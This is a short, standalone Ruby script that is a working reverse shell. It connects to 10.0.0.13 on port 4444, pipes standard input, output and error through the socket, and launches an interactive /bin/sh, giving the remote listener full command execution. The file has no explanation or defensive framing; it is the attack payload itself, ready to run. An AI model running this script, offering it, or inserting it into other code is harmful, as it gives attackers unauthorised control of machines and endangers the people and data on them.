#!/usr/bin/env ruby
require 'socket'
s = TCPSocket.new("10.0.0.13", 4444)
$stdin.reopen(s)
$stdout.reopen(s)
$stderr.reopen(s)
exec("/bin/sh -i")
